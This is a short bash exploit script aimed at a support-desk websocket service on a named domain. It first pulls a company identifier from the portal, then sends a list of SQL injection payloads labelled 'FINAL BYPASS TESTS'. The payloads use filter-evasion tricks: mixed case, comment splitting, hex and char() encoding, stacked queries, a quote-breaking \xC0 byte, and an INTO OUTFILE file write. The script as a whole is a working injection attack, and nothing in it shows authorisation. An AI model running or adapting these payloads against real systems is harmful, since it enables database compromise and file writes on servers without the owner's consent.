#!/bin/bash
company=$(curl -k -s https://support.customer.de/get_portal_info|cut -d'=' -f2|tail -n1|cut -d';' -f1|tr -d '\n\r')
echo "[+] Company: $company"

tests=(
    "SeLeCt VeRsIoN()"
    "sel/**/ect version()"
    "select 0x76657273696f6e()"  # version hex
    "select char(118,101,114,115,105,111,110)"  # char()
    "SeLeCt 1; SeLeCt 2"
    "select 'pwned' into outfile '/tmp/pwned'"
)

echo "🔥 FINAL BYPASS TESTS:"
for test in "${tests[@]}"; do
    echo -ne "\n[+] Testing: $test\n"
    echo -ne "1\n\n0\n\xC0';$test-- -\n" | \
    websocat -k wss://support.customer.de/nw \
        --protocol "ingredi support desk customer thin" \
        -H "X-Ns-Company: $company" \
        --binary | \
    xxd
done
